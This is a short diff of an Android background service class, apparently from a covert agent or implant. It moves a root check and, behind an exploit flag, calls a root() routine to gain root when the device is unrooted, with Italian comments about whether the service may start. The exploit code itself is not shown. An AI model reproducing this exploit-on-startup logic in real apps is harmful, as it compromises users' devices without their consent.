@@ -121,12 +121,14 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
+		if (PackageInfo.checkRoot() == true) {
+			Status.self().setRoot(true);
+		} else {
+			Status.self().setRoot(false);
+		}
+		
 		if (Cfg.EXP) {
-			if (PackageInfo.checkRoot() == true) {
-				Status.self().setRoot(true);
-			} else {
-				Status.self().setRoot(false);
-
+			if (PackageInfo.checkRoot() == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 					Status.self().setRoot(root());
@@ -143,11 +145,11 @@ public class ServiceCore extends Service {
 				Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 
 				switch (ret) {
-				case 0:
-				case 1:
-					return; // Non possiamo partire
-				case 2: // Possiamo partire
-				default:
+					case 0:
+					case 1:
+						return; // Non possiamo partire
+					case 2: // Possiamo partire
+					default:
 					break;
 				}
 			}
